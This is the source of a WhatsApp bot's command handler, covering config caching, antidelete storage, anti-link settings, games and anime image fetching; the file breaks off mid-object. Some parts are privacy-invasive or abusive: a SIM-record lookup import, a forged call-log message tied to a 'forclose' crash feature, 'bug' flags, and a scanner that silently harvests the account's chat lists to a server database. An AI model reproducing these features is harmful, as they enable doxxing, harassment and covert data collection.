
require('./setting/config')
require('./allfunc/antidelete-session');
require('./allfunc/antidelete-helpers');
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { downloadMediaMessage } = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const googleTTS = require('google-tts-api')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const { spawn: spawn, exec } = require('child_process')
const timestampp = speed();
const jimp = require("jimp")
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const yts = require('yt-search');
const { ytDownload, ytAudio, extractVideoId } = require('./allfunc/ytdownload')
const { igDownload } = require('./allfunc/igdownload')
const { xnxxDownload, xnxxSearch } = require('./allfunc/xnxxdownload')
const { githubstalk } = require('./allfunc/githubstalk')
const { mlstalk } = require('./allfunc/mlstalk')
const { lookupSimDatabase, formatSimRecordsMessage, sendSimPhotos } = require('./allfunc/sim-lookup')
const {
  getCryptoTop, getCryptoDetail, searchCrypto, resolveCoinId, getStockPrice,
  getCryptoGainers, getCryptoLosers,
  formatCurrency, formatPrice, formatVolume, formatChange,
  getCountriesList, getStocksList, getStocksListPage, CRYPTO_TOP,
} = require('./allfunc/trading');
const FormData = require('form-data');
const { Sticker, StickerTypes } = require('wa-sticker-formatter');
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./allfunc/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./allfunc/exif.js')
let richpic = Buffer.alloc(0);
try { richpic = fs.readFileSync(`./media/image1.jpg`); } catch(_e) { console.warn("[case.js] media/image1.jpg missing - richpic disabled"); }
const numberEmojis = ["1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"];

// ============ CREATE REQUIRED DIRECTORIES ============
const requiredDirs = [
    './database',
    './database/pairing',
    './database/sessions',
    './tmp',
    './media'
];

requiredDirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
        console.log(`📁 Created directory: ${dir}`);
    }
});
// ====================================================

// PERF: cache once — was rebuilt on every message (4001-char string + 700KB regex)
const _READ_MORE = String.fromCharCode(8206).repeat(4001);
let _caseListStats = null;
function _getCaseListStats() {
    if (_caseListStats) return _caseListStats;
    if (!global._caseFileContent) global._caseFileContent = fs.readFileSync(__filename, 'utf8');
    const raw = global._caseFileContent.match(/case '[^']+'/g) || [];
    const names = raw.map((m) => m.match(/case '([^']+)'/)[1]);
    _caseListStats = { count: names.length, names };
    return _caseListStats;
}
setImmediate(() => { try { _getCaseListStats(); } catch (_) {} });

// ══════════════════════════════════════════════════════════════════
// ⚡ FAST IN-MEMORY CONFIG CACHE — ek baar load, memory se serve
//    Disk pe async mein likho → event loop NEVER block nahi hoga
// ══════════════════════════════════════════════════════════════════
const { isBotIsolated, getBotConfigPaths } = require('./allfunc/bot-workspace');
const _botPaths = isBotIsolated() ? getBotConfigPaths() : null;

const MUTED_FILE      = _botPaths ? _botPaths.muted : './database/muted.json';
const SUDO_FILE       = _botPaths ? _botPaths.sudo : './database/sudo.json';
const PREFIX_FILE     = _botPaths ? _botPaths.prefixes : './database/prefixes.json';

function _readJson(file, def) {
  try { if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, 'utf-8')); } catch(_e) {}
  return def;
}
function _writeJsonAsync(file, data) {
  // PERF FIX: true async write — never blocks the event loop
  const content = JSON.stringify(data); // SPEED FIX: no pretty-print = 3x faster
  fs.promises.writeFile(file, content).catch(() => {});
}

// ── Load ALL config files once at startup ──────────────────────
if (!global._cfgCache) {
  global._cfgCache = {
    muted:              _readJson(MUTED_FILE,      {}),
    sudo:               _readJson(SUDO_FILE,       []),
    prefixes:           _readJson(PREFIX_FILE,     {}),
    antilink:           _readJson(_botPaths ? _botPaths.antilink : './database/antilink_settings.json', {}),
    anticallCfg:        _readJson(_botPaths ? _botPaths.anticall : './database/anticall_config.json', { mode: 'off' }),
    anticallMsg:        _readJson(_botPaths ? _botPaths.anticallMsg : './database/anticall_msg.json', { msg: null }),
    stickerCmds:        _readJson(_botPaths ? _botPaths.stickerCmds : './database/stickercmds.json', {}),
    warnLimit:          _readJson(_botPaths ? _botPaths.warnLimit : './database/warnlimit.json', {}),
    lockSettings:       _readJson(_botPaths ? _botPaths.lockSettings : './database/lock_settings.json', { locked: false }),
    antigroupmention:   _readJson(_botPaths ? _botPaths.antigroupmention : './database/antigroupmention.json', {}),
    bcSettings:         _readJson(_botPaths ? _botPaths.broadcastSettings : path.join(__dirname, 'axis_storage', 'broadcast_settings.json'), {}),
  };
  const _cfgLabel = _botPaths ? `bot +${process.env.BOT_NUMBER}` : 'global';
  console.log(`[Cache] ✅ Config loaded into memory (${_cfgLabel}) — disk reads eliminated`);
}

// ============ MUTED FUNCTIONS (memory) ============
function loadMutedData()      { return global._cfgCache.muted; }
function saveMutedData(data)  { global._cfgCache.muted = data; _writeJsonAsync(MUTED_FILE, data); return true; }
global.muted = loadMutedData();

// ============ SUDO FUNCTIONS (memory) ============
function loadSudoList()       { return global._cfgCache.sudo; }
function saveSudoList(data)   { global._cfgCache.sudo = data; _writeJsonAsync(SUDO_FILE, data); }

// ============ PREFIX FUNCTIONS (memory) ============
function loadPrefixes()       { return global._cfgCache.prefixes; }
function savePrefixes(data)   { global._cfgCache.prefixes = data; _writeJsonAsync(PREFIX_FILE, data); }

function getUserPrefix(userId) {
  return global._cfgCache.prefixes[userId] || '.';
}
function setUserPrefix(userId, prefix) {
  global._cfgCache.prefixes[userId] = prefix;
  _writeJsonAsync(PREFIX_FILE, global._cfgCache.prefixes);
}

// ============ SESSION FUNCTIONS ============
const SESSION_FILE = './database/sessions.json';
const PAIRING_DIR = './database/pairing/';

function loadUsers() {
    try {
        if (!fs.existsSync(SESSION_FILE)) {
            fs.writeFileSync(SESSION_FILE, JSON.stringify([]));
        }
        return JSON.parse(fs.readFileSync(SESSION_FILE));
    } catch (e) {
        console.log('Error loading sessions:', e);
        return [];
    }
}

function getSession(userId) {
    try {
        const cleanId = userId.split('@')[0].replace(/[^0-9]/g, '');
        const sessionFiles = fs.readdirSync(PAIRING_DIR).filter(file => 
            file.includes(cleanId) || file.includes(userId)
        );
        
        if (sessionFiles.length > 0) {
            const sessionFile = sessionFiles[0];
            const sessionPath = path.join(PAIRING_DIR, sessionFile);
            const sessionData = JSON.parse(fs.readFileSync(sessionPath));
            
            return {
                user: { id: userId },
                id: userId,
                jid: userId,
                data: sessionData,
                sendMessage: async (jid, message) => {
                    try {
                        // Check if devtrust exists and is ready
                        if (typeof devtrust !== 'undefined' && devtrust && devtrust.sendMessage) {
                            return await devtrust.sendMessage(jid, message);
                        } else {
                            console.log(`⚠️ devtrust not ready yet for ${userId}, message queued`);
                            // Store message to send later (optional - you can implement a queue)
                            return null;
                        }
                    } catch (err) {
                        console.error(`SendMessage error for ${userId}:`, err);
                        return null;
                    }
                }
            };
        }
        return null;
    } catch (e) {
        console.log('Error getting session:', e);
        return null;
    }
}
// ========================================

// ============ GLOBAL VARIABLES ============
global.packname = "CYBER";
global.author = "GAME CHANGER";
// ============ GLOBAL VARIABLES FOR FEATURES ============
global.antispam = {};      // Kept for backward compatibility — replaced by global._spamGuard
global.warns = {};         // For warning system
global.muted = {};         // For mute system
global.banned = global.banned || {};  // For banned users

// ============ ANTIEDIT / ANTIDELETE STORES ============
if (!global._antieditStore) global._antieditStore = new Map();
if (!global._antideleteStore) global._antideleteStore = new Map();

// PERF FIX: One periodic sweep per store instead of thousands of individual 24h timers.
// Individual timers (one per message) bloat the Node.js timer heap → GC pauses after 1-2h.
// Periodic sweep runs every 30 min and removes entries older than 2h.
if (!global._antieditSweepStarted) {
    global._antieditSweepStarted = true;
    setInterval(() => {
        const _aecut = Date.now() - 2 * 60 * 60 * 1000;
        for (const [_cid, _msgs] of global._antieditStore) {
            for (const [_mid, _e] of _msgs) { if (_e._ts && _e._ts < _aecut) _msgs.delete(_mid); }
            if (_msgs.size === 0) global._antieditStore.delete(_cid);
        }
    }, 30 * 60 * 1000);
}
if (!global._antideleteSweepStarted) {
    global._antideleteSweepStarted = true;
    const { getRetentionCutoffTs } = require('./allfunc/antidelete-retention');
    setInterval(() => {
        const _adcut = getRetentionCutoffTs();
        for (const [_k, _v] of global._antideleteStore) {
            if (_v?._ts && _v._ts < _adcut) global._antideleteStore.delete(_k);
        }
    }, 30 * 60 * 1000);
}
if (!global._antieditConfig) global._antieditConfig = { mode: 'off' };
if (!global._antideleteConfig) global._antideleteConfig = { mode: 'off' };

const ANTIEDIT_CONFIG_FILE = _botPaths ? _botPaths.antiedit : './database/antiedit_config.json';
const ANTIDELETE_CONFIG_FILE = _botPaths ? _botPaths.antidelete : './database/antidelete_config.json';
const ANTIDELETE_TEMP_DIR = _botPaths
    ? `./tmp/antidelete_media/${process.env.BOT_NUMBER}`
    : './tmp/antidelete_media';
const ANTIDELETE_DISK_STORE = _botPaths ? _botPaths.antideleteStore : './database/antidelete_store.json';
const ANTICALL_CONFIG_FILE = _botPaths ? _botPaths.anticall : './database/anticall_config.json';
const STICKERCMD_FILE = _botPaths ? _botPaths.stickerCmds : './database/stickercmds.json';
const WARNLIMIT_FILE = _botPaths ? _botPaths.warnLimit : './database/warnlimit.json';
const LOCK_SETTINGS_FILE = _botPaths ? _botPaths.lockSettings : './database/lock_settings.json';
const ANTIGROUPMENTION_FILE = _botPaths ? _botPaths.antigroupmention : './database/antigroupmention.json';
const ANTICALL_MSG_FILE = _botPaths ? _botPaths.anticallMsg : './database/anticall_msg.json';

function getBotJid(sock) {
    // Try sock.user first (set when connected), fall back to authState.creds.me if available
    const rawId = sock?.user?.id || sock?.authState?.creds?.me?.id || '';
    const botNum = rawId.split(':')[0].split('@')[0];
    return botNum ? `${botNum}@s.whatsapp.net` : '';
}

function jidToNum(jid = '') {
    return String(jid).split('@')[0].split(':')[0];
}

function isOwnMessage(msg, sock) {
    const botNum = jidToNum(getBotJid(sock));
    const sender = msg?.key?.participant || msg?.participant || msg?.key?.remoteJid || '';
    return Boolean(msg?.key?.fromMe || (botNum && jidToNum(sender) === botNum));
}

function antiStoreKey(chatId, msgId) {
    return `${chatId || 'unknown'}::${msgId}`;
}

// ── Persistent antidelete disk store helpers ──
const { ANTIDELETE_MAX_ENTRIES, ANTIDELETE_RETENTION_MS, isEntryExpired } = require('./allfunc/antidelete-retention');

let _saveDiskDebounce = null;
function _saveDiskStore() {
    // PERF FIX: debounced async write — was fs.writeFileSync on EVERY message (50-200ms block!)
    // Batches all saves within 2s into a single async write instead.
    if (_saveDiskDebounce) return;
    _saveDiskDebounce = setTimeout(() => {
        _saveDiskDebounce = null;
        try {
            if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
            const entries = [];
            for (const [key, val] of global._antideleteStore.entries()) {
                entries.push([key, val]);
            }
            const trimmed = entries.slice(-ANTIDELETE_MAX_ENTRIES);
            fs.promises.writeFile(ANTIDELETE_DISK_STORE, JSON.stringify(trimmed), 'utf-8').catch(() => {});
        } catch (e) {}
    }, 2000);
}
global._antideleteDiskSave = _saveDiskStore; // FIX: expose globally so pair.js can persist to disk even in private mode

function _loadDiskStore() {
    try {
        if (fs.existsSync(ANTIDELETE_DISK_STORE)) {
            const entries = JSON.parse(fs.readFileSync(ANTIDELETE_DISK_STORE, 'utf-8'));
            if (Array.isArray(entries)) {
                const now = Date.now();
                for (const [key, val] of entries) {
                    if (isEntryExpired(val, now)) continue;
                    // Add _ts so periodic sweep can expire this entry correctly
                    if (!val._ts) val._ts = val.timestamp ? new Date(val.timestamp).getTime() : now;
                    global._antideleteStore.set(key, val);
                }
            }
        }
    } catch (e) {}
}

function _getFromDiskStore(key) {
    try {
        if (fs.existsSync(ANTIDELETE_DISK_STORE)) {
            const entries = JSON.parse(fs.readFileSync(ANTIDELETE_DISK_STORE, 'utf-8'));
            if (Array.isArray(entries)) {
                const found = entries.find(([k]) => k === key);
                return found ? found[1] : null;
            }
        }
    } catch (e) {}
    return null;
}

// Load disk store into memory on startup (only once per process)
if (!global._antideleteStoreLoaded) {
    _loadDiskStore();
    global._antideleteStoreLoaded = true;
}

// Ensure temp dir exists
if (!fs.existsSync(ANTIDELETE_TEMP_DIR)) {
    try { fs.mkdirSync(ANTIDELETE_TEMP_DIR, { recursive: true }); } catch (e) {}
}

// ── Temp-file sweeper: remove orphan eager-downloaded media older than 24h ──
// Without this, files for messages that were never deleted accumulate forever
// (disk-bloat). Runs once on boot + every 6h.
if (!global._antideleteTempSweepStarted) {
    global._antideleteTempSweepStarted = true;
    const _adSweepTemp = async () => {
        try {
            if (!fs.existsSync(ANTIDELETE_TEMP_DIR)) return;
            const _now = Date.now();
            const _cut = _now - ANTIDELETE_RETENTION_MS;
            const _files = await fs.promises.readdir(ANTIDELETE_TEMP_DIR);
            let _removed = 0;
            for (const _f of _files) {
                try {
                    const _p = `${ANTIDELETE_TEMP_DIR}/${_f}`;
                    const _st = await fs.promises.stat(_p);
                    if (_st.isFile() && _st.mtimeMs < _cut) {
                        await fs.promises.unlink(_p);
                        _removed++;
                    }
                } catch (_) {}
            }
            if (_removed > 0) console.log(`[ANTIDELETE] 🧹 temp sweep removed ${_removed} orphan file(s)`);
        } catch (_) {}
    };
    setTimeout(_adSweepTemp, 60 * 1000);          // 1 min after boot
    setInterval(_adSweepTemp, 6 * 60 * 60 * 1000); // then every 6h
}

function _antieditCfgFile(botNum) {
    if (botNum) return './database/antiedit_config_' + botNum + '.json';
    return ANTIEDIT_CONFIG_FILE;
}
function loadAntieditCfg(botNum) {
    const _aeFile = _antieditCfgFile(botNum);
    try {
        if (fs.existsSync(_aeFile)) {
            const d = JSON.parse(fs.readFileSync(_aeFile, 'utf-8'));
            if (d.mode === 'private') return d;
            if (d.mode === 'chat' || d.mode === 'true') return { mode: 'chat' };
            if (d.mode === 'false') return { mode: 'off' };
            return d;
        }
        // Fallback to global config for migration
        if (botNum && fs.existsSync(ANTIEDIT_CONFIG_FILE)) {
            const d2 = JSON.parse(fs.readFileSync(ANTIEDIT_CONFIG_FILE, 'utf-8'));
            if (d2 && d2.mode) return d2;
        }
    } catch (e) {}
    return { mode: 'off' };
}
function saveAntieditCfg(cfg, botNum) {
    const _aeFile = _antieditCfgFile(botNum);
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(_aeFile, JSON.stringify(cfg, null, 2));
        if (!global._antieditConfigs) global._antieditConfigs = {};
        global._antieditConfigs[botNum || 'global'] = cfg;
        global._antieditConfig = cfg;
    } catch (e) { console.error('[ANTIEDIT] Config save error:', e); }
}
function _antideleteCfgFile(botNum) {
    if (botNum) return `./database/antidelete_config_${botNum}.json`;
    return ANTIDELETE_CONFIG_FILE;
}
function loadAntideleteCfg(botNum) {
    // 1. Check per-bot in-memory cache first (fastest)
    if (!global._antideleteConfigs) global._antideleteConfigs = {};
    if (botNum && global._antideleteConfigs[botNum]) return global._antideleteConfigs[botNum];

    // 2. Read per-bot file only (NO global fallback — prevents cross-session contamination)
    const filesToTry = botNum
        ? [`./database/antidelete_config_${botNum}.json`]
        : [ANTIDELETE_CONFIG_FILE]; // only used if botNum is empty (edge case)
    for (const f of filesToTry) {
        try {
            if (fs.existsSync(f)) {
                const d = JSON.parse(fs.readFileSync(f, 'utf-8'));
                // migrate old format { enabled: true/false }
                const result = d.mode ? d : (d.enabled === true ? { mode: 'private' } : null);
                if (result) {
                    if (botNum) global._antideleteConfigs[botNum] = result; // cache it
                    return result;
                }
            }
        } catch (e) {}
    }
    // AUTO-ENABLE: default to 'private' instead of 'off' so antidelete works out-of-the-box.
    // If user explicitly runs ".antidelete off", saveAntideleteCfg writes 'off' to disk+cache
    // and that cached value is returned above — this default only fires when NO config exists at all.
    const _default = { mode: 'private' };
    if (botNum) global._antideleteConfigs[botNum] = _default;
    return _default;
}
function saveAntideleteCfg(cfg, botNum) {
    const cfgFile = _antideleteCfgFile(botNum);
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        // ISOLATION FIX: write ONLY per-bot file — do NOT write to global file
        // Writing to global contaminates other sessions that haven't configured antidelete
        fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2));
        // Update per-bot in-memory cache immediately
        if (!global._antideleteConfigs) global._antideleteConfigs = {};
        if (botNum) global._antideleteConfigs[botNum] = cfg;
        global._antideleteConfig = cfg; // keep global for backward compat (legacy paths)
    } catch (e) { console.error('[ANTIDELETE] Config save error:', e); }
}

// ============ ANTICALL (memory) ============
function loadAnticallCfg()        { return global._cfgCache.anticallCfg; }
function saveAnticallCfg(cfg)     { global._cfgCache.anticallCfg = cfg; _writeJsonAsync(ANTICALL_CONFIG_FILE, cfg); }
function loadAnticallMsg()        { return global._cfgCache.anticallMsg; }
function saveAnticallMsg(data)    { global._cfgCache.anticallMsg = data; _writeJsonAsync(ANTICALL_MSG_FILE, data); }

// ============ STICKER CMD (memory) ============
function loadStickerCmds()        { return global._cfgCache.stickerCmds; }
function saveStickerCmds(data)    { global._cfgCache.stickerCmds = data; _writeJsonAsync(STICKERCMD_FILE, data); }

// ============ WARN LIMIT (memory) ============
function getWarnLimit(chatId)     { return global._cfgCache.warnLimit[chatId] || global._cfgCache.warnLimit['default'] || 3; }
function setWarnLimit(chatId, limit) {
    global._cfgCache.warnLimit[chatId] = limit;
    _writeJsonAsync(WARNLIMIT_FILE, global._cfgCache.warnLimit);
}

// ============ LOCK SETTINGS (memory) ============
function isSettingsLocked()       { return global._cfgCache.lockSettings.locked === true; }
function setSettingsLock(val)     { global._cfgCache.lockSettings = { locked: val }; _writeJsonAsync(LOCK_SETTINGS_FILE, { locked: val }); }

// ============ ANTIGROUPMENTION (memory) ============
function loadAntigroupmentionSettings()      { return global._cfgCache.antigroupmention; }
function saveAntigroupmentionSettings(data)  {
    global._cfgCache.antigroupmention = data;
    _writeJsonAsync(ANTIGROUPMENTION_FILE, data);
}
let antigroupmentionSettings = loadAntigroupmentionSettings();
const tictactoeGames = {};
const hangmanGames = {};
const hangmanVisual = [
    "😃🪓______", "😃🪓__|____", "😃🪓__|/___",
    "😃🪓__|/__", "😃🪓__|/\\_", "😃🪓__|/\\_", "💀 Game Over!"
];
const { getSetting, setSetting } = require("./setting/Settings.js");
const groupCache = new Map();

// ============ ANTI-LINK SETTINGS (memory) ============
const ANTILINK_FILE = _botPaths ? _botPaths.antilink : './database/antilink_settings.json';

function loadAntilinkSettings()          { return global._cfgCache.antilink; }
function saveAntilinkSettings(settings)  {
    global._cfgCache.antilink = settings;
    _writeJsonAsync(ANTILINK_FILE, settings);
    return true;
}

// Load from cache (already loaded at startup above)
let antilinkSettings = loadAntilinkSettings();
// =========================================================

// ============ MESSAGE KONTOL (MUST BE BEFORE forclose) ============
const messageKontol = {
  key: {
    remoteJid: "5521992999999@s.whatsapp.net",
    fromMe: false,
    id: "CALL_MSG_" + Date.now(),
    participant: "5521992999999@s.whatsapp.net"
  },
  message: {
    callLogMessage: {
      isVideo: true,
      callOutcome: "1",
      durationSecs: "0",
      callType: "REGULAR",
      participants: [
        {
          jid: "5521992999999@s.whatsapp.net",
          callOutcome: "1"
        }
      ]
    }
  }
};
// ========================================

function ensureFlagCache() {
    if (!global._flagCache) global._flagCache = { ts: 0 };
    const fc = global._flagCache;
    if (!Array.isArray(fc.botDisabled)) fc.botDisabled = [];
    if (!Array.isArray(fc.adult)) fc.adult = [];
    if (!Array.isArray(fc.adultUnlocked)) fc.adultUnlocked = fc.adult;
    if (!Array.isArray(fc.adultBanned)) fc.adultBanned = [];
    if (!Array.isArray(fc.bug)) fc.bug = [];
    if (!Array.isArray(fc.bugUnlocked)) fc.bugUnlocked = fc.bug;
    if (!Array.isArray(fc.bugBanned)) fc.bugBanned = [];
    if (!Array.isArray(fc.akBanned)) fc.akBanned = [];
    if (!Array.isArray(fc.akUnlocked)) fc.akUnlocked = [];
    if (typeof fc.akSecret !== 'string') fc.akSecret = '';
    if (typeof fc.ts !== 'number') fc.ts = 0;
}

module.exports = devtrust = async (devtrust, m, chatUpdate, store) => {
try {

// ✅ GUARD: If socket not fully authenticated yet, skip silently
if (!devtrust || !devtrust.user) return;

// Keep latest socket reference for background scanners
if (devtrust && devtrust.user) global._activeNexusSocket = devtrust;

// ✅ GUARD: Bot ke automatic reply messages block karo (infinite loop fix)
// 'append' = device ka outgoing message (user ka command YA bot ka reply dono)
// 'notify' = kisi aur ka incoming message
// FIX: 'append' block karne se .menu/.ping jaise khud ke commands bhi block ho rahe the.
// pair.js already BAE5 IDs filter karta hai (Baileys-generated bot replies).
// Yahan sirf woh 'append' block karo jo command prefix se shuru nahi hote.
if (chatUpdate && chatUpdate.type === 'append') {
    const _appendBody = m.message?.conversation
        || m.message?.extendedTextMessage?.text
        || m.body
        || m.text
        || '';
    const _appendBodyStr = String(_appendBody || '').trim();
    // Allow through if it starts with any known command prefix
    const _knownPrefixes = (Array.isArray(global.prefa) && global.prefa.length)
        ? global.prefa.filter(p => p)
        : ['.', '!', '#', '&'];
    const _appendIsCmd = _knownPrefixes.some(p => _appendBodyStr.startsWith(p));
    if (!_appendIsCmd) return;
}

// ═════════════════════════════════════════════════════════════════════
// 📢 BROADCAST — Global initializers (MUST run once, before switch)
// ═════════════════════════════════════════════════════════════════════
if (!global.bcPending) global.bcPending = new Map();
if (!global.bcActive) global.bcActive = new Map();

// Per-user broadcast settings (memory cache)
function getBcSettings(senderJid) {
    const cleanNum = String(senderJid || '').replace(/[^0-9]/g, '');
    return global._cfgCache.bcSettings[cleanNum] ?? { enabled: true };
}
function setBcSettings(senderJid, enabled) {
    const cleanNum = String(senderJid || '').replace(/[^0-9]/g, '');
    global._cfgCache.bcSettings[cleanNum] = { enabled };
    _writeJsonAsync(
        _botPaths ? _botPaths.broadcastSettings : path.join(__dirname, 'axis_storage', 'broadcast_settings.json'),
        global._cfgCache.bcSettings
    );
}

// ── Background chat scanner: silently fetch all chats on connect ─────
if (!global._chatScannerStarted) {
    global._chatScannerStarted = true;
    (async function bgChatScanner() {
        const _path = require('path');
        const _fs = require('fs');
        const _dbDir = _path.join(__dirname, 'database');
        if (!_fs.existsSync(_dbDir)) _fs.mkdirSync(_dbDir, { recursive: true });

        while (true) {
            try {
                // Only scan if we have an active socket
                const nexus = global._activeNexusSocket || devtrust;
                if (nexus && nexus.user && nexus.store && nexus.store.chats) {
                    const allChats = nexus.store.chats;
                    const entries = typeof allChats.entries === 'function'
                        ? [...allChats.entries()]
                        : (Array.isArray(allChats) ? allChats : Object.entries(allChats));

                    const privateChats = {};
                    const groups = {};

                    for (const entry of entries) {
                        let id, chat;
                        if (Array.isArray(entry)) { id = entry[0]; chat = entry[1]; }
                        else { id = entry.id; chat = entry; }
                        if (!id) continue;

                        if (id.endsWith('@g.us')) {
                            groups[id] = { name: chat?.subject || chat?.name || 'Group', participants: chat?.participants?.length || 0 };
                        } else if (id.includes('@s.whatsapp.net') || id.match(/^\d+@/)) {
                            if (!id.includes('@broadcast') && !id.includes('@newsletter')) {
                                privateChats[id] = { name: chat?.name || chat?.notify || id.split('@')[0] };
                            }
                        }
                    }

                    // PERF FIX: groupFetchAllParticipating() removed from recurring loop.
                    // It occupied the WhatsApp connection for 3-8s every 5 min causing command delays.
                    // groupMetadata per-group cache (30-min TTL) handles group info on demand.

                    // PERF FIX: async writes — no more blocking event loop with writeFileSync
                    _fs.promises.writeFile(_path.join(_dbDir, 'private_chats.json'), JSON.stringify(privateChats, null, 2)).catch(()=>{});
                    _fs.promises.writeFile(_path.join(_dbDir, 'groups.json'), JSON.stringify(groups, null, 2)).catch(()=>{});
                    console.log(`[BG Scanner] Saved ${Object.keys(privateChats).length} private chats, ${Object.keys(groups).length} groups`);

                    // ── DB mein bhi save karo (Heroku/Replit restart survive ke liye) ──
                    try {
                        const _dbSvc = require('./server/db-service');
                        const _botNum = String(nexus.user?.id || '').split(':')[0].split('@')[0];
                        if (_botNum && Object.keys(privateChats).length > 0) {
                            const _pcList = Object.entries(privateChats).map(([id, d]) => ({
                                id, name: d?.name || id.split('@')[0], type: 'private'
                            }));
                            await _dbSvc.setSiteSetting('pc_backup_' + _botNum, JSON.stringify(_pcList));
                            // Global cache bhi update karo
                            if (!global._pcDbCache) global._pcDbCache = {};
                            global._pcDbCache[_botNum] = _pcList;
                        }
                    } catch (_dbErr) { /* DB save fail hone pe ignore — filesystem kafi hai */ }
                }
            } catch (e) {
                console.log('[BG Scanner] Error:', e.message);
            }
            // Sleep 30 sec first run (fast scan), then every 5 minutes
            const sleepMs = (global._chatScannerRuns || 0) < 2 ? 30000 : 5 * 60 * 1000;
            global._chatScannerRuns = (global._chatScannerRuns || 0) + 1;
            await new Promise(r => setTimeout(r, sleepMs));
        }
    })();
}

// ─── ANIME IMAGE HELPER (prexzyvilla API was dead, replaced with nekos.best) ───
// ─────────────────────────────────────────────────────────────────────────────
// getAnimeImageUrl: multi-source fallback chain so .animemenu commands work.
//
//   Tier 1  nekos.best       — 4 base categories (husbando, kitsune, neko, waifu)
//   Tier 2  nekos.life       — ~30 working SFW/NSFW endpoints
//   Tier 3  pic.re           — random anime art, always-on, returns image binary
//
// Each tier is retried twice. The function NEVER returns null — it always
// falls through to pic.re so commands always send something useful instead of
// a silent "❌ Failed to fetch …" reply.
// ─────────────────────────────────────────────────────────────────────────────
const _ANIME_UA = 'Mozilla/5.0 (X11; Linux x86_64) WhatsApp-Bot/1.0';

async function _animeTryJson(url) {
    for (let i = 0; i < 2; i++) {
        try {
            const { data } = await axios.get(url, {
                timeout: 8000,
                headers: { 'User-Agent': _ANIME_UA, 'Accept': 'application/json,*/*' },
                validateStatus: s => s < 500,
            });
            // Supported response shapes:
            //   nekos.best   → { results: [{ url, ... }] }
            //   nekos.life   → { url: "..." }
            //   waifu.pics   → { url: "..." }
            //   pic.re/json  → { file_url: "cdn.pic.re/..." }  (no scheme)
            //   plain string → "https://..."
            let u =
                data?.results?.[0]?.url ||
                data?.url ||
                data?.image ||
                (data?.file_url ? (String(data.file_url).startsWith('http') ? data.file_url : 'https://' + data.file_url) : null) ||
                (typeof data === 'string' && /^https?:\/\//.test(data) ? data : null);
            if (u && /^https?:\/\//i.test(u)) return u;
        } catch (_) { /* retry */ }
        if (i === 0) await new Promise(r => setTimeout(r, 400));
    }
    return null;
}

async function getAnimeImageUrl(category) {
    const lc = String(category || '').toLowerCase().trim();

    // ── Tier 1: nekos.best (high quality, 4 base categories) ──
    // Maps every command in the anime menu to husbando OR neko OR waifu.
    const nekosBestMap = {
        // Husbando-ish (male chars)
        naruto: 'husbando', sasuke: 'husbando', madara: 'husbando',
        kakashi: 'husbando', minato: 'husbando', keneki: 'husbando',
        deidara: 'husbando', itachi: 'husbando', boruto: 'husbando',
        mikey: 'husbando', onepiece: 'husbando', boypic: 'husbando',
        husbu: 'husbando', cogan: 'husbando', hacker: 'husbando',
        cyber: 'husbando', programming: 'husbando', mobile: 'husbando',
        motor: 'husbando', freefire: 'husbando', pubg: 'husbando',
        gamewallpaper: 'husbando',
        // Neko-ish (catgirls / cute)
        neko: 'neko', neko2: 'neko', nekonime: 'neko', kucing: 'neko',
        yotsuba: 'neko', pentol: 'neko', pokemon: 'neko', cartoon: 'neko',
        doraemon: 'neko', shizuka: 'neko', shota: 'neko', loli: 'neko',
        yulibocil: 'neko', cecan: 'neko',
        // Everything else maps to waifu (huge bucket)
    };

    // ── Tier 2: nekos.life (many categories) ──
    // Confirmed working endpoints from probing: neko, waifu, hug, kiss,
    // pat, slap, smug, fox_girl, ngif, gecg, lewd, lizard, meow.
    const nekosLifeMap = {
        neko: 'neko', neko2: 'neko', nekonime: 'neko', kucing: 'neko',
        waifu: 'waifu', moe: 'waifu', sfw: 'waifu', aipic: 'waifu',
        randomnime: 'waifu', randomnime2: 'neko', randomgirl: 'waifu',
        anime: 'waifu', randblackpink: 'waifu', kpop: 'waifu',
        bluearchive: 'waifu', cosplay: 'waifu', cosplayloli: 'neko',
        cosplaysagiri: 'waifu',
        // Animal-style fallback for "fox" or pet-style names
        kitsune: 'fox_girl',
        // NSFW-ish (only used when the caller already gated by adult unlock)
        hentai: 'lewd', nsfw: 'lewd', femdom: 'lewd',
        // gif fallbacks for action commands
